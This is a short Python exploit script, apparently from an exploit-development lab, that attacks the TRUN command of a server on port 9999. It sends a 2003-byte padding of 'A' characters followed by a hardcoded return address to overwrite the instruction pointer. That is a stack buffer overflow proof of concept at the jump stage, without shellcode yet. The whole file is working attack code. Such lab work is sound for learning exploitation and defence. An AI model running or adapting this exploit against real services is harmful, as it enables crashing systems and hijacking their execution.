#!/usr/bin/python

import sys, socket

#2003 is the length of bytes to the EIP as per finding the offset 

#625011af
rtn = b"\xaf\x11\x50\x62" # byte string 
buf = "TRUN /.:/" + "A" * 2003 # regular string 
try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("Attempting to connect to server")
	s.connect(('192.168.56.1', 9999))
	print("[+] Sending the payload...\n")
	
	#s.send((payload.encode()))
	payload = buf.encode() + rtn #encode regular string and concat the byte string 
	#into one long byte string! 
	s.send((payload))
	s.close()
        
except:
	print("Error connecting to server")
	sys.exit()
